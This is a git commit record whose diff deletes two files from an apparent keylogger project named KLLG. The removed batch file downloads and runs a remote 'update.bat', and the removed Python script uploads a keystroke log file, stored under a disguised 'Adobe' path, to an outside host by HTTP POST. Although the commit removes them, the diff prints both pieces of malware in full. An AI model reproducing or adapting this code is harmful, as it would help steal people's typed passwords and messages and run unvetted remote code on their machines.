82a22f5222dfafade8ded4a2225dd093c06a682d
fancode343 <118608942+fancode343@users.noreply.github.com>
2024-09-30 23:24:05 +0800

    Delete KLLG directory

--- KLLG/UPDT/1.bat
+++
@@ -1,2 +0,0 @@
-curl https://raw.githubusercontent.com/fancode343/keylgg/main/update/update.bat -O
-update.bat
--- KLLG/get.py
+++
@@ -1,9 +0,0 @@
-import requests
-
-url = 'http://antburger.guormit.cf/index.php?p=keys'
-
-files = {'file': open('C:/Win/Adobe/KLLG/keyslogs.txt', 'rb')}
-
-r = requests.post(url, files=files)
-print(r.status_code)
-print(r.text)
